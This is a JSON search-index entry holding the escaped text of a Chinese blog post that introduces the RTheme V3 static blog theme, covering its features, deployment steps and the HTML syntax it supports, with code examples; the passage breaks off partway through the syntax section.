[{"name":"RThemeV3: 全面升级","url":"/articles/20230815/","time":"2023-08-15","class":["技术","设计","文档"],"tag":["javascript","css","nodejs","html"],"title":["前言","特点","高性能","自动化","响应式","功能丰富","函数化","seo友好","全站搜索","自动订阅更新","高兼容性","单页应用程序","原生音乐播放器","过渡自然","轻量化&原生实现","代码高亮","标签&分类自动索引","语言自定义","设置自定义","自动目录索引","文章旁路推荐","内置高级下载器","使用","开发","licence","部署","修改模板","修改内容","支持的语法展示","段落分隔","标题","超链接","信息栏","代码","引用","文字控件","媒体内容","时间","大型文本框","表格","列表","分隔线","图标","编写并发布文章","确定文章信息","复制模板文件","更改文章信息","更改索引信息","发布更改","高级","配置多站点","配置feed信息","配置边缘服务","twikoo评论","umami统计","betterstack的uptime服务","修改设置项","依赖","下载","后记"],"context":"&amp;nbsp;前言&amp;nbsp;上半年里，一些令我意想不到的事情发生了。&amp;nbsp;为了让自己能平静下来，我希望给自己找点事做，于是决定重制RTheme。&amp;nbsp;这个工程量还是十分巨大的，在v1的基础上，我更改了页面的布局，准备将其直接以v2发布，但一不做二不休，最终全面的重制了RTheme，并将其版本号直接跳到V3.0.0。&amp;nbsp;现在的RTheme，足够强大，符合我对它的预期。不过，V3的开发并未结束，其中两个重要的功能---可视化编辑器和用户登录系统尚未完工。&amp;nbsp;然而，因为学业原因，到明年高考为止我都无法再进行开发。所以，暂时先做到这。&amp;nbsp;如有兴趣，可以在此主题的基础上二次开发。也欢迎PR或提issue作为建议&amp;nbsp;Github&amp;nbsp;-&amp;nbsp;RavelloH/RTheme&amp;nbsp;特点&amp;nbsp;高性能&amp;nbsp;得益于重新设计的主题框架，主题现在在性能方面已经登峰造极，在Google&amp;nbsp;PageSpeed&amp;nbsp;Insights测试中取得了400/400的满分成绩。&amp;nbsp;Google&amp;nbsp;PageSpeed&amp;nbsp;检测结果&amp;nbsp;在实际体验中，RTheme使用Web&amp;nbsp;Worker异步处理高负载任务，异步加载/执行渲染，避免阻塞页面；其主动预加载也降低了页面的加载延迟。&amp;nbsp;在v3版本的全面升级中，主题已经改造为单页应用程序，加之顺畅的内容过渡，流畅性大大提升。&amp;nbsp;自动化&amp;nbsp;RTheme使用Github&amp;nbsp;Actions在云端自动部署，无需本地干预，即可自动完成索引更新、自动订阅更新、站点地图更新、文章旁路推荐等功能。&amp;nbsp;此外，RTheme优化了自身的架构，使得其编写文章十分简单----仅需要了解HTML语法即可。你也可以选择使用Markdown编辑。之后，其组件将在渲染时自动无感添加。&amp;nbsp;响应式&amp;nbsp;主题使用响应式设计，基准元素均使用flex/grid布局，在各尺寸屏幕上表现出色。&amp;nbsp;功能丰富&amp;nbsp;主题功能丰富，内置设置/分享/在线音乐播放/多站点测速/自动全站搜索/文章自定义排序/文章标签&amp;分类自动索引/站点地图/RSS/Atom自动生成/文章自动推荐/内置高级下载器/主动型预加载/用户登录接口/外链截图API等等一系列功能，创造出属于极客的极致主题框架。&amp;nbsp;函数化&amp;nbsp;主题中除了用于管控初始化加载的loading.js，其余脚本均将各功能包装为函数，以保证其可复用性及可免依赖乱序加载。&amp;nbsp;这使得二次开发十分简单，可直接复用主题框架中的功能。&amp;nbsp;SEO友好&amp;nbsp;主题自动根据页面内容生成两种格式的sitemap，优化搜索引擎抓取。&amp;nbsp;全站搜索&amp;nbsp;主题与可持续集成的RPageSearch深度集成，以提供静态站的全站高级搜索功能。&amp;nbsp;详见RavelloH/RPageSearch。高性能/实时搜索/正则语法支持/异步/web&amp;nbsp;worker/自动持续构建/可拓展数据格式，提供丰富的搜索功能。&amp;nbsp;自动订阅更新&amp;nbsp;主题基于页面内容自动生成RSS、Atom、JSON&amp;nbsp;Feed三种格式的订阅信息。&amp;nbsp;高兼容性&amp;nbsp;主题最早支持到Chrome58(2017年4月19日),Firefox52(2017年3月7日),Opera45(2017年5月10日)，Safari，能够提供兼容性的保障。&amp;nbsp;注：IE已死，不支持IE。&amp;nbsp;单页应用程序&amp;nbsp;主题使用PJAX技术进行页面加载，并在页面加载切换之间加入过渡动画。&amp;nbsp;另外，主题也会在页面加载时更新左下角的进度条，以展示正在加载/加载超时/加载完成/加载失败等不同场景。&amp;nbsp;原生音乐播放器&amp;nbsp;主题内置原生音乐播放器，支持播放/切换/跳转/循环等功能，且可进行在线搜索以使用在线资源。&amp;nbsp;也支持在文章内部加入音乐播放器，来调用主题的播放器进行播放。&amp;nbsp;过渡自然&amp;nbsp;主题内置顺滑的元素切换函数switchElementContext()，以保证元素切换的顺滑自然。&amp;nbsp;轻量化&amp;原生实现&amp;nbsp;主题本体大小小于600KB，无任何框架，保证了其高速的加载性能。&amp;nbsp;代码高亮&amp;nbsp;主题使用highlight.js代码高亮，并在其基础上使用Web&amp;nbsp;Worker并行加载，防止页面阻塞。&amp;nbsp;标签&amp;分类自动索引&amp;nbsp;主题能自动根据文章信息索引具有相应标签/分类的文章，无需干预。&amp;nbsp;语言自定义&amp;nbsp;主题的语言文件包单独成文件，你可以根据自己的需要更改模板，也可实现其国际化。&amp;nbsp;设置自定义&amp;nbsp;主题可进行各式设置，以提供个性化体验。&amp;nbsp;设置项使用cookie存储，并且使用列表快速创建，保证其易用性。&amp;nbsp;自动目录索引&amp;nbsp;主题可根据文章内标题自动生成目录，并高亮阅读项，以提高阅读体验。&amp;nbsp;文章旁路推荐&amp;nbsp;文章结尾自动推荐上一篇/下一篇文章，无需手动设置。效果见上方图片。&amp;nbsp;内置高级下载器&amp;nbsp;主题内置下载器，提高整体感。你可以在文章中使用。&amp;nbsp;详阅#箱式下载盒&amp;nbsp;使用&amp;nbsp;虽然此主题独立于其他任何静态博客生成器，不过作为标榜属于极客的主题，它使用模板化设计，你可以使用全局替换快速进行个性化配置。&amp;nbsp;参阅#部署&amp;nbsp;主题部署成功后，将包含一篇默认的Hello&amp;nbsp;World的文章，其中包含语法示例与文章编发流程。&amp;nbsp;开发&amp;nbsp;欢迎改进/修复/增加主题的功能。你可以使用nodejs在本地查看更改。&amp;nbsp;git&amp;nbsp;clone&amp;nbsp;https://github.com/RavelloH/RTheme&amp;nbsp;cd&amp;nbsp;RTheme&amp;nbsp;npm&amp;nbsp;install&amp;nbsp;npx&amp;nbsp;http-server&amp;nbsp;-c-1&amp;nbsp;另外，也可以直接运行RTheme的build流程&amp;nbsp;cd&amp;nbsp;program&amp;nbsp;npm&amp;nbsp;install&amp;nbsp;node&amp;nbsp;search.js&amp;nbsp;node&amp;nbsp;feed.js&amp;nbsp;node&amp;nbsp;fileList.js&amp;nbsp;Licence&amp;nbsp;MIT&amp;nbsp;部署&amp;nbsp;修改模板&amp;nbsp;在RTheme&amp;nbsp;v3中，默认已经搭建了一套标准页面结构模板，你可以使用全局替换的方式快速自定义。&amp;nbsp;可用的模板文字及它在我的博客中的配置如下：&amp;nbsp;${siteName}&amp;nbsp;RavelloH&#39;s&amp;nbsp;Blog&amp;nbsp;${authorName}&amp;nbsp;RavelloH&amp;nbsp;${siteURL}&amp;nbsp;https://ravelloh.top&amp;nbsp;${siteDomain}&amp;nbsp;ravelloh.top&amp;nbsp;${siteShareImage}&amp;nbsp;https://ravelloh.top/assets/images/android-chrome-512x512.png&amp;nbsp;${nav1}&amp;nbsp;images&amp;nbsp;${navName1}&amp;nbsp;IMAGES&amp;nbsp;${navIcon1}&amp;nbsp;ri:image-fill&amp;nbsp;${nav2}&amp;nbsp;games&amp;nbsp;${navName2}&amp;nbsp;GAMES&amp;nbsp;${navIcon2}&amp;nbsp;ri:gamepad-fill&amp;nbsp;${nav3}&amp;nbsp;unset&amp;nbsp;${navName3}&amp;nbsp;unset&amp;nbsp;${navIcon3}&amp;nbsp;unset&amp;nbsp;${sentence}&amp;nbsp;Welcome&amp;nbsp;here&amp;nbsp;and&amp;nbsp;fell&amp;nbsp;free&amp;nbsp;to&amp;nbsp;check&amp;nbsp;it&amp;nbsp;out&amp;nbsp;...&amp;nbsp;${githubUserName}&amp;nbsp;RavelloH&amp;nbsp;${authorMail}&amp;nbsp;ravelloh@outlook.com&amp;nbsp;${copyrightStart}&amp;nbsp;2019&amp;nbsp;${siteStartTime}&amp;nbsp;2/03/2019&amp;nbsp;20:52:00&amp;nbsp;模板名&amp;nbsp;描述&amp;nbsp;示例&amp;nbsp;${siteName}&amp;nbsp;站点名&amp;nbsp;RavelloH&#39;s&amp;nbsp;Blog&amp;nbsp;${authorName}&amp;nbsp;作者名&amp;nbsp;RavelloH&amp;nbsp;${siteURL}&amp;nbsp;站点链接。包含协议，无需尾缀斜杠&amp;nbsp;https://ravelloh.top&amp;nbsp;${siteDomain}&amp;nbsp;域名。用于标识可信域名&amp;nbsp;ravelloh.top&amp;nbsp;${siteShareImage}&amp;nbsp;分享时展示的图片&amp;nbsp;https://ravelloh.top/assets/images/android-chrome-512x512.png&amp;nbsp;${nav1}&amp;nbsp;侧边菜单栏的可设置项的路径&amp;nbsp;images&amp;nbsp;${navName1}&amp;nbsp;侧边菜单栏的可设置项的显示名称，一般大写&amp;nbsp;IMAGES&amp;nbsp;${navIcon1}&amp;nbsp;侧边菜单栏的可设置项的显示图标&amp;nbsp;ri:image-fill&amp;nbsp;${nav2}&amp;nbsp;侧边菜单栏的可设置项的路径&amp;nbsp;games&amp;nbsp;${navNam2}&amp;nbsp;侧边菜单栏的可设置项的显示名称，一般大写&amp;nbsp;GAMES&amp;nbsp;${navIcon2}&amp;nbsp;侧边菜单栏的可设置项的显示图标&amp;nbsp;ri:gamepad-fill&amp;nbsp;${nav3}&amp;nbsp;侧边菜单栏的可设置项的路径&amp;nbsp;-&amp;nbsp;${navName3}&amp;nbsp;侧边菜单栏的可设置项的显示名称，一般大写&amp;nbsp;-&amp;nbsp;${navIcon3}&amp;nbsp;侧边菜单栏的可设置项的显示图标&amp;nbsp;-&amp;nbsp;${sentence}&amp;nbsp;显示在主页中的一段句子&amp;nbsp;Welcome&amp;nbsp;here&amp;nbsp;and&amp;nbsp;fell&amp;nbsp;free&amp;nbsp;to&amp;nbsp;check&amp;nbsp;it&amp;nbsp;out&amp;nbsp;...&amp;nbsp;${githubUserName}&amp;nbsp;Github用户名&amp;nbsp;RavelloH&amp;nbsp;${authorMail}&amp;nbsp;站长联系邮箱&amp;nbsp;ravelloh@outlook.com&amp;nbsp;${copyrightStart}&amp;nbsp;建站开始时间的年份&amp;nbsp;2019&amp;nbsp;${siteStartTime}&amp;nbsp;建站时间&amp;nbsp;2/03/2019&amp;nbsp;20:52:00&amp;nbsp;你需要做的，就是使用一个具有全局替换功能的编辑器(例如VSCode)将其替换。&amp;nbsp;没有也没关系，下面提供四种方法：&amp;nbsp;使用VSCode&amp;nbsp;在本地使用VSCode需要先拉取代码到本地。参阅#下载。&amp;nbsp;之后，你可以使用编辑器的替换功能逐项全部替换。&amp;nbsp;使用Github&amp;nbsp;Dev&amp;nbsp;你也可以使用Github&amp;nbsp;Dev，只需要将你自己的仓库中的github.com替换为github.dev即可使用。无需再拉取代码，直接替换即可。替换操作同#使用VSCode&amp;nbsp;使用Github&amp;nbsp;CodeSpace&amp;nbsp;你可以在你自己的仓库中使用CodeSpace。&amp;nbsp;之后的操作方式与#使用VSCode相同。&amp;nbsp;使用code-server&amp;nbsp;上面的操作需要你有一个Github账号，如果你没有账号，你可以使用我部署在Repl.it上的code-server。&amp;nbsp;Code&amp;nbsp;Server&amp;nbsp;默认的密码是RavelloH，你可以自由clone并替换代码。&amp;nbsp;修改内容&amp;nbsp;在模板修改完成后，主题基本上就配置完成了。&amp;nbsp;不过，你可能会想修改部分页面的默认文字。直接转到相应页面，修改其内容即可。&amp;nbsp;在此过程中，你可以自由使用各种html语法。不过注意：只有在#viewmap中所做的编辑才会被展示出来。其余地方的编辑，因为页面是PJAX加载，你需要将每个页面的内容全部修改才能保证它在各个页面上表现相同。&amp;nbsp;支持的语法展示&amp;nbsp;段落分隔&amp;nbsp;&lt;p&gt;&amp;nbsp;这是一个普通段落。&amp;nbsp;&lt;/p&gt;&amp;nbsp;&lt;p&gt;&amp;nbsp;这是第二个段落。&amp;nbsp;&lt;/p&gt;&amp;nbsp;&lt;p&amp;nbsp;class=&quot;center&quot;&gt;&amp;nbsp;这是个居中的段落。&amp;nbsp;&lt;/p&gt;&amp;nbsp;这是一个普通段落。&amp;nbsp;这是第二个段落。&amp;nbsp;这是个居中的段落。&amp;nbsp;标题&amp;nbsp;注意：标题请勿以数字开头，主题会自动在目录中添加序号，以数字开头的标题将无法正常解析。&amp;nbsp;在主题中，因为h1表示文章的主标题，所以文章内容中可用的超链接包括h2&amp;nbsp;h3&amp;nbsp;h4&amp;nbsp;h5&amp;nbsp;h6。&amp;nbsp;主题会自动标题渲染锚点、样式？目录等，所以在使用时只需要使用标准html格式：&amp;nbsp;&lt;h2&gt;这是一个h2标题&lt;/h2&gt;&amp;nbsp;&lt;h3&gt;这是一个h3标题&lt;/h3&gt;&amp;nbsp;超链接&amp;nbsp;超链接在RTheme中一共分六种，可以按需使用。&amp;nbsp;其中，三种高级超链接(箱式超链接、箱式音乐盒、箱式下载盒)使用时的语法基本与普通超链接相同，不过要使用它们需要在普通超链接的基础上添加type属性来注明它们的类型。&amp;nbsp;内部超链接&amp;nbsp;&lt;a&amp;nbsp;href=&quot;/articles/&quot;&gt;这是一个指向/articles/的内部超链接&lt;/a&gt;，它的颜色跟其他的字体有区别，但是没有图标和下划线。&amp;nbsp;&lt;a&amp;nbsp;href=&quot;https://ravelloh.top/&quot;&amp;nbsp;class=&quot;noline&quot;&gt;这是一个指向https://ravelloh.top/的外部超链接&lt;/a&gt;，它有一个名为&lt;code&gt;noline&lt;/code&gt;的类名，所以跟内部链接表现相同。&amp;nbsp;这是一个指向/articles/的内部超链接，它的颜色跟其他的字体有区别，但是没有图标和下划线。&amp;nbsp;这是一个指向https://ravelloh.top/的外部超链接，它有一个名为noline的类名，所以跟内部链接表现相同。&amp;nbsp;外部超链接&amp;nbsp;&lt;a&amp;nbsp;href=&quot;/articles/&quot;&amp;nbsp;class=&quot;link&quot;&gt;这是一个指向/articles/的内部超链接&lt;/a&gt;，但是它有一个名为&lt;code&gt;link&lt;/code&gt;的类名，所以它表现的与外部链接相同。&amp;nbsp;&lt;a&amp;nbsp;href=&quot;https://ravelloh.top/&quot;&gt;这是一个指向https://ravelloh.top/的外部超链接&lt;/a&gt;，它具有下划线和图标来表示它指向站外。&amp;nbsp;这是一个指向/articles/的内部超链接，但是它有一个名为link的类名，所以它表现的与外部链接相同。&amp;nbsp;这是一个指向https://ravelloh.top/的外部超链接，它具有下划线和图标来表示它指向站外。&amp;nbsp;主题会自动为目标为http或https的超链接添加此样式，不过你可以设置noline的类名来取消此样式。&amp;nbsp;按钮式超链接&amp;nbsp;&lt;a&amp;nbsp;href=&quot;/articles/&quot;&amp;nbsp;class=&quot;button&quot;&gt;Articles&lt;/a&gt;&amp;nbsp;&lt;a&amp;nbsp;href=&quot;/works/&quot;&amp;nbsp;class=&quot;button&quot;&gt;Works&lt;/a&gt;&amp;nbsp;&lt;a&amp;nbsp;href=&quot;/about/&quot;&amp;nbsp;class=&quot;button&quot;&gt;About&lt;/a&gt;&amp;nbsp;Articles&amp;nbsp;Works&amp;nbsp;About&amp;nbsp;箱式超链接&amp;nbsp;箱式超链接依赖我自己搭建的网页截图API，不过，你也可以自己部署。它的使用方式十分简单，主题会自动添加额外的属性。&amp;nbsp;&lt;a&amp;nbsp;href=&quot;https://ravelloh.top/&quot;&amp;nbsp;type=&quot;link-box&quot;&gt;RavelloH&#39;s&amp;nbsp;Blog&lt;/a&gt;&amp;nbsp;RavelloH&#39;s&amp;nbsp;Blog&amp;nbsp;箱式音乐盒&amp;nbsp;箱式音乐盒的配置较为复杂。不过，RTheme会自动生成相应结构及信息。&amp;nbsp;你可以使用RTheme自带的音乐搜索器搜索相应歌曲，并点击&quot;＋&quot;复制超链接。&amp;nbsp;之后，将其粘贴到文档内即可。RTheme会自动生成相应结构及信息。&amp;nbsp;&lt;a&amp;nbsp;href=&quot;http://music.163.com/song/media/outer/url?id=1477655546.mp3&quot;&amp;nbsp;type=&quot;music-box&quot;&amp;nbsp;info=&quot;&lt;span&amp;nbsp;class=&#39;music-search-author&#39;&gt;&amp;nbsp;&lt;span&amp;nbsp;class=&#39;i_small&amp;nbsp;ri:account-box-line&#39;&gt;&lt;/span&gt;&amp;nbsp;West&amp;nbsp;&amp;&amp;nbsp;Zander&amp;nbsp;-&amp;nbsp;&lt;span&amp;nbsp;class=&#39;i_small&amp;nbsp;ri:mv-line&#39;&gt;&lt;/span&gt;&amp;nbsp;Deep&amp;nbsp;Breathing&lt;/span&gt;&quot;&amp;nbsp;src=&quot;http://p1.music.126.net/FDE2goZS7DJ3HhIBFsQEMQ==/109951165303988707.jpg&quot;&gt;Autumn&amp;nbsp;Haze&lt;/a&gt;&amp;nbsp;在点击时，会自动调用RTheme内置播放器播放。&amp;nbsp;Autumn&amp;nbsp;Haze&amp;nbsp;你也可以手动设置，需要设置的项如下:&amp;nbsp;项&amp;nbsp;描述&amp;nbsp;默认值&amp;nbsp;type&amp;nbsp;设置为music-box以启用音乐盒&amp;nbsp;undefined&amp;nbsp;href&amp;nbsp;指向的音乐文件链接&amp;nbsp;undefined&amp;nbsp;info(可选)&amp;nbsp;显示的音乐附加信息，会在第二行显示&amp;nbsp;&quot;无更多信息&quot;&amp;nbsp;src(可选)&amp;nbsp;显示的封面图像&amp;nbsp;/assets/images/music.jpg&amp;nbsp;箱式下载盒&amp;nbsp;&lt;a&amp;nbsp;href=&quot;https://drive.ravelloh.top/api/raw/?path=/video/%E9%AC%BC%E6%B3%A35.mp4&quot;&amp;nbsp;type=&quot;download-box&quot;&gt;鬼泣5测试视频.mp4&lt;/a&gt;&amp;nbsp;点击时，会调用主题内置下载器进行下载。其中，标签的内容即为下载内容将保存为的文件名。&amp;nbsp;鬼泣5测试视频.mp4&amp;nbsp;信息栏&amp;nbsp;&lt;div&amp;nbsp;class=&quot;info&quot;&gt;&amp;nbsp;这是个普通信息栏。&amp;nbsp;&lt;/div&gt;&amp;nbsp;&lt;div&amp;nbsp;class=&quot;info-success&quot;&gt;&amp;nbsp;这个信息栏可以用来表示成功的消息。&amp;nbsp;&lt;/div&gt;&amp;nbsp;&lt;div&amp;nbsp;class=&quot;info-warning&quot;&gt;&amp;nbsp;这个信息栏可以用来表示警告的消息。&amp;nbsp;&lt;/div&gt;&amp;nbsp;&lt;div&amp;nbsp;class=&quot;info-alert&quot;&gt;&amp;nbsp;这个信息栏可以用来表示失败的消息。&amp;nbsp;&lt;/div&gt;&amp;nbsp;&lt;div&amp;nbsp;class=&quot;info-alert&amp;nbsp;center&quot;&gt;&amp;nbsp;&lt;span&amp;nbsp;class=&quot;i_small&amp;nbsp;ri:spam-line&quot;&gt;&lt;/span&gt;&amp;nbsp;这是个居中的信息栏，并且带有小图标。&amp;nbsp;&lt;/div&gt;&amp;nbsp;这是个普通信息栏。&amp;nbsp;这个信息栏可以用来表示成功的消息。&amp;nbsp;这个信息栏可以用来表示警告的消息。&amp;nbsp;这个信息栏可以用来表示失败的消息。&amp;nbsp;这是个居中的信息栏，并且带有小图标。&amp;nbsp;代码&amp;nbsp;行内代码&amp;nbsp;你可以直接使用&lt;code&gt;内容&lt;/code&gt;来插入行内代码，效果如本句。&amp;nbsp;代码块&amp;nbsp;带有行数显示的代码块&amp;nbsp;将代码转换为这个格式比较麻烦，你需要先转义代码，之后将每一行包裹在span标签内。&amp;nbsp;因此，我做了个自动转换器，可以直接转换为此格式代码。https://ravelloh.top/tools/code/&amp;nbsp;默认设置下，类名中带有codeline的代码块会被自动语法高亮。你可以删除此类名来禁用对单个代码块的语法高亮。&amp;nbsp;&lt;div&amp;nbsp;class=&quot;codeline&quot;&gt;&amp;nbsp;&lt;pre&gt;&amp;nbsp;&lt;span&gt;&amp;lt;details&amp;gt;&amp;nbsp;&lt;/span&gt;&amp;nbsp;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;lt;summary&amp;gt;Show&amp;lt;/summary&amp;gt;&lt;/span&gt;&amp;nbsp;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;lt;!--&amp;nbsp;readme-tree&amp;nbsp;start&amp;nbsp;--&amp;gt;&lt;/span&gt;&amp;nbsp;&lt;span&gt;&amp;nbsp;&amp;nbsp;&amp;lt;!--&amp;nbsp;readme-tree&amp;nbsp;end&amp;nbsp;--&amp;gt;&lt;/span&gt;&amp;nbsp;&lt;span&gt;&amp;lt;/details&amp;gt;&lt;/span&gt;&amp;nbsp;&lt;/pre&gt;&amp;nbsp;&lt;/div&gt;&amp;nbsp;&lt;details&gt;&amp;nbsp;&lt;summary&gt;Show&lt;/summary&gt;&amp;nbsp;&lt;!--&amp;nbsp;readme-tree&amp;nbsp;start&amp;nbsp;--&gt;&amp;nbsp;&lt;!--&amp;nbsp;readme-tree&amp;nbsp;end&amp;nbsp;--&gt;&amp;nbsp;&lt;/details&gt;&amp;nbsp;无行数代码块&amp;nbsp;不建议这样使用代码块，这样可能导致样式丢失等问题。&amp;nbsp;&lt;pre&gt;&amp;nbsp;&lt;code&amp;nbsp;class=&quot;language-js&quot;&gt;&amp;nbsp;function&amp;nbsp;getSearchData()&amp;nbsp;{&amp;nbsp;if&amp;nbsp;(typeof&amp;nbsp;searchData&amp;nbsp;==&amp;nbsp;&quot;undefined&quot;)&amp;nbsp;{&amp;nbsp;return&amp;nbsp;new&amp;nbsp;Promise((resolve,&amp;nbsp;reject)&amp;nbsp;=&amp;gt;&amp;nbsp;{&amp;nbsp;fetch(dataFilePath,&amp;nbsp;{})&amp;nbsp;.then((response)&amp;nbsp;=&amp;gt;&amp;nbsp;response.json())&amp;nbsp;.then((data)&amp;nbsp;=&amp;gt;&amp;nbsp;{&amp;nbsp;searchData&amp;nbsp;=&amp;nbsp;data;&amp;nbsp;resolve(data);&amp;nbsp;});&amp;nbsp;}).catch((err)&amp;nbsp;=&amp;gt;&amp;nbsp;{&amp;nbsp;throw&amp;nbsp;err;&amp;nbsp;});&amp;nbsp;}&amp;nbsp;else&amp;nbsp;{&amp;nbsp;return&amp;nbsp;Promise.resolve(searchData);&amp;nbsp;}&amp;nbsp;}&amp;nbsp;function&amp;nbsp;search(keyword)&amp;nbsp;{&amp;nbsp;let&amp;nbsp;start&amp;nbsp;=&amp;nbsp;new&amp;nbsp;Date().getTime();&amp;nbsp;if&amp;nbsp;(keyword&amp;nbsp;==&amp;nbsp;&quot;&quot;&amp;nbsp;||&amp;nbsp;keyword&amp;nbsp;==&amp;nbsp;&quot;.&quot;)&amp;nbsp;{&amp;nbsp;return&amp;nbsp;false;&amp;nbsp;}&amp;nbsp;searchWord&amp;nbsp;=&amp;nbsp;HTMLDecode(keyword);&amp;nbsp;getSearchData().then((data)&amp;nbsp;=&amp;gt;&amp;nbsp;{&amp;nbsp;if&amp;nbsp;(typeof&amp;nbsp;searchWorker&amp;nbsp;==&amp;nbsp;&quot;undefined&quot;)&amp;nbsp;{&amp;nbsp;searchWorker&amp;nbsp;=&amp;nbsp;new&amp;nbsp;Worker(workerPath);&amp;nbsp;}&amp;nbsp;searchWorker.onmessage&amp;nbsp;=&amp;nbsp;(result)&amp;nbsp;=&amp;gt;&amp;nbsp;{&amp;nbsp;let&amp;nbsp;end&amp;nbsp;=&amp;nbsp;new&amp;nbsp;Date().getTime();&amp;nbsp;let&amp;nbsp;data&amp;nbsp;=&amp;nbsp;result.data;&amp;nbsp;console.log(`查询操作用时${end&amp;nbsp;-&amp;nbsp;start}MS`);&amp;nbsp;if&amp;nbsp;(data.length&amp;nbsp;==&amp;nbsp;0)&amp;nbsp;{&amp;nbsp;console.log(&quot;未找到有关选项&quot;);&amp;nbsp;return&amp;nbsp;false;&amp;nbsp;}&amp;nbsp;let&amp;nbsp;resultHTML&amp;nbsp;=&amp;nbsp;&quot;&quot;;&amp;nbsp;data.forEach((e,&amp;nbsp;index)&amp;nbsp;=&amp;gt;&amp;nbsp;{&amp;nbsp;resultHTML&amp;nbsp;+=&amp;nbsp;structureSearchResult(e);&amp;nbsp;});&amp;nbsp;console.log(resultHTML);&amp;nbsp;//&amp;nbsp;结果输出&amp;nbsp;};&amp;nbsp;searchWorker.postMessage([data,&amp;nbsp;searchWord]);&amp;nbsp;});&amp;nbsp;}&amp;nbsp;&lt;/code&gt;&amp;nbsp;&lt;/pre&gt;&amp;nbsp;function&amp;nbsp;getSearchData()&amp;nbsp;{&amp;nbsp;if&amp;nbsp;(typeof&amp;nbsp;searchData&amp;nbsp;==&amp;nbsp;&quot;undefined&quot;)&amp;nbsp;{&amp;nbsp;return&amp;nbsp;new&amp;nbsp;Promise((resolve,&amp;nbsp;reject)&amp;nbsp;=&gt;&amp;nbsp;{&amp;nbsp;fetch(dataFilePath,&amp;nbsp;{})&amp;nbsp;.then((response)&amp;nbsp;=&gt;&amp;nbsp;response.json())&amp;nbsp;.then((data)&amp;nbsp;=&gt;&amp;nbsp;{&amp;nbsp;searchData&amp;nbsp;=&amp;nbsp;data;&amp;nbsp;resolve(data);&amp;nbsp;});&amp;nbsp;}).catch((err)&amp;nbsp;=&gt;&amp;nbsp;{&amp;nbsp;throw&amp;nbsp;err;&amp;nbsp;});&amp;nbsp;}&amp;nbsp;else&amp;nbsp;{&amp;nbsp;return&amp;nbsp;Promise.resolve(searchData);&amp;nbsp;}&amp;nbsp;}&amp;nbsp;function&amp;nbsp;search(keyword)&amp;nbsp;{&amp;nbsp;let&amp;nbsp;start&amp;nbsp;=&amp;nbsp;new&amp;nbsp;Date().getTime();&amp;nbsp;if&amp;nbsp;(keyword&amp;nbsp;==&amp;nbsp;&quot;&quot;&amp;nbsp;||&amp;nbsp;keyword&amp;nbsp;==&amp;nbsp;&quot;.&quot;)&amp;nbsp;{&amp;nbsp;return&amp;nbsp;false;&amp;nbsp;}&amp;nbsp;searchWord&amp;nbsp;=&amp;nbsp;HTMLDecode(keyword);&amp;nbsp;getSearchData().then((data)&amp;nbsp;=&gt;&amp;nbsp;{&amp;nbsp;if&amp;nbsp;(typeof&amp;nbsp;searchWorker&amp;nbsp;==&amp;nbsp;&quot;undefined&quot;)&amp;nbsp;{&amp;nbsp;searchWorker&amp;nbsp;=&amp;nbsp;new&amp;nbsp;Worker(workerPath);&amp;nbsp;}&amp;nbsp;searchWorker.onmessage&amp;nbsp;=&amp;nbsp;(result)&amp;nbsp;=&gt;&amp;nbsp;{&amp;nbsp;let&amp;nbsp;end&amp;nbsp;=&amp;nbsp;new&amp;nbsp;Date().getTime();&amp;nbsp;let&amp;nbsp;data&amp;nbsp;=&amp;nbsp;result.data;&amp;nbsp;console.log(`查询操作用时${end&amp;nbsp;-&amp;nbsp;start}MS`);&amp;nbsp;if&amp;nbsp;(data.length&amp;nbsp;==&amp;nbsp;0)&amp;nbsp;{&amp;nbsp;console.log(&quot;未找到有关选项&quot;);&amp;nbsp;return&amp;nbsp;false;&amp;nbsp;}&amp;nbsp;let&amp;nbsp;resultHTML&amp;nbsp;=&amp;nbsp;&quot;&quot;;&amp;nbsp;data.forEach((e,&amp;nbsp;index)&amp;nbsp;=&gt;&amp;nbsp;{&amp;nbsp;resultHTML&amp;nbsp;+=&amp;nbsp;structureSearchResult(e);&amp;nbsp;});&amp;nbsp;console.log(resultHTML);&amp;nbsp;//&amp;nbsp;结果输出&amp;nbsp;};&amp;nbsp;searchWorker.postMessage([data,&amp;nbsp;searchWord]);&amp;nbsp;});&amp;nbsp;}&amp;nbsp;引用&amp;nbsp;&lt;blockquote&gt;&amp;nbsp;曾经有人说过，....&amp;nbsp;&lt;/blockquote&gt;&amp;nbsp;曾经有人说过，....&amp;nbsp;文字控件&amp;nbsp;以下效果均可嵌套组合使用&amp;nbsp;&lt;h4&gt;粗体&lt;/h4&gt;&amp;nbsp;你可以&lt;b&gt;加粗&lt;/b&gt;一段文字。&amp;nbsp;&lt;h4&gt;强调&lt;/h4&gt;&amp;nbsp;你可以&lt;strong&gt;强调&lt;/strong&gt;一段文字。&amp;nbsp;&lt;h4&gt;斜体&lt;/h4&gt;&amp;nbsp;你可以&lt;em&gt;斜体显示&lt;/em&gt;一段文字。&amp;nbsp;&lt;h4&gt;下划线&lt;/h4&gt;&amp;nbsp;你可以为一段文字添加&lt;u&gt;下划线&lt;/u&gt;。&amp;nbsp;&lt;h4&gt;删除线&lt;/h4&gt;&amp;nbsp;你可以&lt;del&gt;删除&lt;/del&gt;一段文字。&amp;nbsp;&lt;h4&gt;添加线&lt;/h4&gt;&amp;nbsp;你可以&lt;ins&gt;添加&lt;/ins&gt;一段文字。&amp;nbsp;&lt;h4&gt;键盘文本&lt;/h4&gt;&amp;nbsp;你可以用&lt;kdb&gt;TAB&lt;/kdb&gt;和&lt;kdb&gt;SHITF&lt;/kdb&gt;+&lt;kdb&gt;TAB&lt;/kdb&gt;来在网页中移动。&amp;nbsp;&lt;h4&gt;行内引用&lt;/h4&gt;&amp;nbsp;《国语·周语下》是&lt;q&gt;众口铄金，积毁销骨&lt;/q&gt;的出处。&amp;nbsp;&lt;h4&gt;引用来源&lt;/h4&gt;&amp;nbsp;这篇文章来源于&lt;cite&gt;&lt;a&amp;nbsp;href=&quot;https://ravelloh.top/articles/20230815/&quot;&gt;RavelloH的博客&lt;/a&gt;&lt;/cite&gt;。&amp;nbsp;&lt;h4&gt;突出显示&lt;/h4&gt;&amp;nbsp;&lt;mark&gt;这段文字&lt;/mark&gt;是高亮突出显示的。&amp;nbsp;&lt;h4&gt;注音&lt;/h4&gt;&amp;nbsp;&lt;ruby&gt;汉&amp;nbsp;&lt;rp&gt;(&lt;/rp&gt;&lt;rt&gt;han&lt;/rt&gt;&lt;rp&gt;)&lt;/rp&gt;&amp;nbsp;字&amp;nbsp;&lt;rp&gt;(&lt;/rp&g